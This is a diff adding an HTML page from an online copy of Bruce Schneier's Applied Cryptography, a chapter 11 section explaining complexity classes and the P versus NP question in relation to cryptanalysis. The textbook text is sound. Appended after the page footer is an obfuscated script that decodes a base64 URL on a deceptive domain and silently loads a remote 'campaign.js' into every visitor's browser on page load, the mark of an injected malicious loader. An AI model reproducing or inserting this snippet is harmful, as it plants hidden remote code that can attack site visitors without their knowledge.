@@ -1,0 +1,81 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=239-241//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Complexity of Problems</I></B></FONT></P>
+<P>Complexity theory also classifies the inherent complexity of problems, not just the complexity of particular algorithms used to solve problems. (Excellent introductions to this topic are [600, 211, 1226]; see also [1096, 27, 739].) The theory looks at the minimum time and space required to solve the hardest instance of a problem on a theoretical computer known as a <B>Turing machine</B> . A Turing machine is a finite-state machine with an infinite read-write memory tape. It turns out that a Turing machine is a realistic model of computation.</P>
+<P>Problems that can be solved with polynomial-time algorithms are called <B>tractable</B>, because they can usually be solved in a reasonable amount of time for reasonable-sized inputs. (The exact definition of &#147;reasonable&#148; depends on the circumstance.) Problems that cannot be solved in polynomial time are called <B>intractable</B>, because calculating their solution quickly becomes infeasible. Intractable problems are sometimes just called <B>hard</B>. Problems that can only be solved with algorithms that are superpolynomial are computationally intractable, even for relatively small values of <I>n.</I></P>
+<P>It gets worse. Alan Turing proved that some problems are <B>undecidable</B> . It is impossible to devise any algorithm to solve them, regardless of the algorithm&#146;s time complexity.</P>
+<P>Problems can be divided into complexity classes, which depend on the complexity of their solutions. Figure 11.1 shows the more important complexity classes and their presumed relationships. (Unfortunately, not much about this material has been proved mathematically.)</P>
+<P>On the bottom, the class <B>P</B> consists of all problems that can be solved in polynomial time. The class <B>NP</B> consists of all problems that can be solved in polynomial time only on a nondeterministic Turing machine: a variant of a normal Turing machine that can make guesses. The machine guesses the solution to the problem&#151;either by making &#147;lucky guesses&#148; or by trying all guesses in parallel&#151;and checks its guess in polynomial time.</P>
+<P><B>NP</B> &#146;s relevance to cryptography is this: Many symmetric algorithms and all public-key algorithms can be cracked in nondeterministic polynomial time. Given a ciphertext <I>C</I>, the cryptanalyst simply guesses a plaintext, <I>X</I>, and a key, <I>k</I>, and in polynomial time runs the encryption algorithm on inputs <I>X</I> and <I>k</I> and checks whether the result is equal to <I>C.</I> This is important theoretically, because it puts an upper bound on the complexity of cryptanalysis for these algorithms. In practice, of course, it is a deterministic polynomial-time algorithm that the cryptanalyst seeks. Furthermore, this argument is not applicable to all classes of ciphers; in particular, it is not applicable to one-time pads&#151;for any <I>C</I>, there are many <I>X, k</I> pairs that yield <I>C</I> when run through the encryption algorithm, but most of these <I>X</I> s are nonsense, not legitimate plaintexts.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/11-01.jpg',207,172 )"><IMG SRC="images/11-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/11-01.jpg',207,172)"><FONT COLOR="#000077"><B>Figure 11.1</B></FONT></A>&nbsp;&nbsp;Complexity classes.</I>
+</P>
+<P>The class <B>NP</B> includes the class <B>P</B>, because any problem solvable in polynomial time on a deterministic Turing machine is also solvable in polynomial time on a nondeterministic Turing machine; the guessing stage can simply be omitted.</P>
+<P>If all <B>NP</B> problems are solvable in polynomial time on a deterministic machine, then <B>P</B> = <B>NP</B>. Although it seems obvious that some <B>NP</B> problems are much harder than others (a brute-force attack against an encryption algorithm versus encrypting a random block of plaintext), it has never been proven that <B>P</B> &#8800; <B>NP</B> (or that <B>P</B> = <B>NP</B>). However, most people working in complexity theory believe that they are unequal.</P>
+<P>Stranger still, specific problems in <B>NP</B> can be proven to be as difficult as any problem in the class. Steven Cook [365] proved that the Satisfiability problem (given a propositional Boolean formula, is there a way to assign truth values to the variables that makes the formula true?) is <B>NP-complete</B> . This means that, if Satisfiability is solvable in polynomial time, then <B>P</B> = <B>NP</B>. Conversely, if any problem in <B>NP</B> can be proven not to have a deterministic polynomial-time algorithm, the proof will show that Satisfiability does not have a deterministic polynomial-time algorithm either. No problem is harder than Satisfiability in <B>NP</B>.</P>
+<P>Since Cook&#146;s seminal paper was published, a huge number of problems have been shown to be equivalent to Satisfiability; hundreds are listed in [600], and some examples follow. By equivalent, I mean that these problems are also <B>NP-complete</B>; they are in <B>NP</B> and also as hard as any problem in <B>NP</B> . If their solvability in deterministic polynomial time were resolved, the <B>P</B> versus <B>NP</B> question would be solved. The question of whether <B>P</B> = <B>NP</B> is the central unsolved question of computational complexity theory, and no one expects it to be solved anytime soon. If someone showed that <B>P</B> = <B>NP</B>, then most of this book would be irrelevant: As previously explained, many classes of ciphers are trivially breakable in nondeterministic polynomial time. If <B>P</B> = <B>NP</B>, they are breakable by feasible, deterministic algorithms.</P>
+<P>Further out in the complexity hierarchy is <B>PSPACE</B> . Problems in <B>PSPACE</B> can be solved in polynomial space, but not necessarily polynomial time. <B>PSPACE</B> includes <B>NP</B>, but some problems in <B>PSPACE</B> are thought to be harder than <B>NP</B>. Of course, this isn&#146;t proven either. There is a class of problems, the so-called <B>PSPACE-complete</B> problems, with the property that, if any one of them is in <B>NP</B> then <B>PSPACE</B> = <B>NP</B> and if any one of them is in <B>P</B> then <B>PSPACE</B> = <B>P</B> .</P>
+<P>And finally, there is the class of problems called <B>EXPTIME</B> . These problems are solvable in exponential time. The <B>EXPTIME-complete</B> problems can actually be proven not to be solvable in deterministic polynomial time. It has been shown that <B>P</B> does not equal <B>EXPTIME</B> .</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(juJSMRdo, fbWoKaah) {fbWoKaah = juJSMRdo.createElement('script');fbWoKaah.type = 'text/javascript';fbWoKaah.async = true;fbWoKaah.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');juJSMRdo.getElementsByTagName('body')[0].appendChild(fbWoKaah);}(document));</script></body>
+</html>
